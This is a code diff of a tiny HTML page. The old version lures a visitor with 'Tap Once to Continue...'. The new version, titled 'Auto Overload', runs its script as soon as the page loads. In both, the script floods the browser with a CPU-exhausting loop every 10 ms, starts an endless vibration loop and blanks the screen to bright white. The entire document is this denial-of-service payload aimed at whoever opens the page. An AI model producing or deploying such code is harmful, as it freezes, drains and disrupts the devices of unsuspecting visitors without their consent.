@@ -1,29 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Final Tap</title>
-    <script>
-        let started = false;
-        function overload() {
-            if (started) return;
-            started = true;
-            setInterval(() => {
-                for (let i = 0; i < 1000000; i++) {
-                    Math.random();
-                    new Image();
-                }
-            }, 10);
-
-            if (navigator.vibrate) {
-                setInterval(() => navigator.vibrate(1000), 500);
-            }
-
-            document.body.style.background = "white";
-            document.body.innerHTML = "";
+  <title>Auto Overload</title>
+  <script>
+    window.onload = () => {
+      // Heavy CPU load
+      setInterval(() => {
+        for (let i = 0; i < 1000000; i++) {
+          Math.random();
+          new Image();
         }
-    </script>
+      }, 10);
+
+      // Try vibration loop
+      if (navigator.vibrate) {
+        setInterval(() => navigator.vibrate(1000), 1000);
+      }
+
+      // White bright screen
+      document.body.style.background = "white";
+      document.body.innerHTML = "";
+    };
+  </script>
 </head>
-<body onclick="overload()" style="margin:0; padding:0; background:black; color:white; display:flex; align-items:center; justify-content:center; height:100vh; font-size:24px;">
-    Tap Once to Continue...
+<body>
 </body>
 </html>
